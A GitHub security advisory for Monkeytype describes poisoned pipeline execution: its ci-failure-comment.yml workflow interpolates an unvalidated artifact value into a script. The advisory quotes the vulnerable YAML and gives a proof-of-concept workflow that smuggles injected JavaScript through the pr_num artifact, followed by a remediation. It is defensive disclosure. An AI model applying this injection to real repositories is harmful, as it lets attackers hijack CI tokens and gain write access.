
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmonkeytypegame%2Fmonkeytype%2Fsecurity%2Fadvisories%2FGHSA-wcjf-5464-4wq9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmonkeytypegame%2Fmonkeytype%2Fsecurity%2Fadvisories%2FGHSA-wcjf-5464-4wq9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=monkeytypegame%2Fmonkeytype)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[monkeytypegame](/monkeytypegame)
/
**[monkeytype](/monkeytypegame/monkeytype)**
Public

* [Notifications](/login?return_to=%2Fmonkeytypegame%2Fmonkeytype) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fmonkeytypegame%2Fmonkeytype)
* [Star
   16.3k](/login?return_to=%2Fmonkeytypegame%2Fmonkeytype)

* [Code](/monkeytypegame/monkeytype)
* [Issues
  43](/monkeytypegame/monkeytype/issues)
* [Pull requests
  15](/monkeytypegame/monkeytype/pulls)
* [Discussions](/monkeytypegame/monkeytype/discussions)
* [Actions](/monkeytypegame/monkeytype/actions)
* [Projects
  0](/monkeytypegame/monkeytype/projects)
* [Security](/monkeytypegame/monkeytype/security)
* [Insights](/monkeytypegame/monkeytype/pulse)

Additional navigation options

* [Code](/monkeytypegame/monkeytype)
* [Issues](/monkeytypegame/monkeytype/issues)
* [Pull requests](/monkeytypegame/monkeytype/pulls)
* [Discussions](/monkeytypegame/monkeytype/discussions)
* [Actions](/monkeytypegame/monkeytype/actions)
* [Projects](/monkeytypegame/monkeytype/projects)
* [Security](/monkeytypegame/monkeytype/security)
* [Insights](/monkeytypegame/monkeytype/pulse)

# Monkeytype is vulnerable to Poisoned Pipeline Execution through Code Injection in its `ci-failure-comment.yml` GitHub Workflow, enabling attackers to gain `pull-requests` write access.

Critical

[Miodec](/Miodec)
published
GHSA-wcjf-5464-4wq9
Aug 2, 2024

## Package

No package listed

## Affected versions

<=v24.29.0

## Patched versions

>=v24.30.0

## Description

## Summary

Monkeytype is vulnerable to Poisoned Pipeline Execution through Code Injection in its `ci-failure-comment.yml` GitHub Workflow, enabling attackers to gain `pull-requests` write access.

## Details

### Code Injection in `ci-failure-comment.yml` (`GHSL-2024-167`)

The [`ci-failure-comment.yml` workflow](https://github.com/monkeytypegame/monkeytype/blob/1838816bff756453290d558ba913ef907cd3dae6/.github/workflows/ci-failure-comment.yml) is triggered when the `Monkey CI` workflow completes:

```
on:
  workflow_run:
    workflows: [Monkey CI]
    types: [completed]
```

When it runs, it will download an artifact uploaded by the triggering workflow and assign the contents of `./pr_num/pr_num.txt` artifact to the `steps.pr_num_reader.outputs.content` WorkFlow variable:

```
- name: Download workflow artifact
  uses: dawidd6/action-download-artifact@v2.11.0
  with:
    github_token: ${{ secrets.GITHUB_TOKEN }}
    workflow: peek_icons.yml
    run_id: ${{ github.event.workflow_run.id }}

- name: Read the pr_num file
  id: pr_num_reader
  uses: juliangruber/read-file-action@v1.0.0
  with:
    path: ./pr_num/pr_num.txt
```

It is not validated that the variable is actually a number and later it is interpolated into a JS script allowing an attacker to change the code to be executed:

```
- name: Create comment
  uses: actions/github-script@v6
  with:
    github-token: ${{ secrets.API_TOKEN }}
    script: |
      github.rest.issues.createComment({
        issue_number: ${{ steps.pr_num_reader.outputs.content }},
        owner: context.repo.owner,
        repo: context.repo.repo,
         body: 'Continuous integration check(s) failed. Please review the failing check\'s logs and make the necessary changes. ' + context.payload.workflow_run.html_url
      })
```
#### Proof Of Concept

* Fork the repo.
* Create a new branch.
* Modify the contents of `.github/workflows/monkey-ci.yml` to:

```
name: Monkey CI

on:
  pull_request:

jobs:
  exploit:
    permissions: write-all
    runs-on: ubuntu-latest
    steps:
      - name: Write exploit to artifact
        shell: bash
        run: echo '`${console.log('PWNED')}`' > pr_num.txt

      - name: Upload the exploit
        uses: actions/upload-artifact@v3
        with:
          name: pr_num
          path: ./pr_num.txt
```

* Create a Pull request with this change to the master branch of monkeytype.
* The modified workflow will trigger and will upload an artifact with the exploit which will trigger the second workflow which will download it and interpolate it into the JS script.

#### Impact

This issue leads to [`pull-requests` write access](https://github.com/monkeytypegame/monkeytype/actions/runs/9957625850/job/27510033064#step:1:18).

#### Remediation

Pass the contents of `steps.pr_num_reader.outputs.content` variable through an environment variable.

#### Resources

* [CodeQL for JavaScript - Expression injection in Actions](https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/)
* [Keeping your GitHub Actions and workflows secure Part 2: Untrusted input](https://securitylab.github.com/research/github-actions-untrusted-input/)
* [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

### Severity

Critical

### CVE ID

CVE-2024-41127

### Weaknesses

No CWEs

### Credits

* [![@pwntester](https://avatars.githubusercontent.com/u/125701?s=40&v=4)](/pwntester)
  [pwntester](/pwntester)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

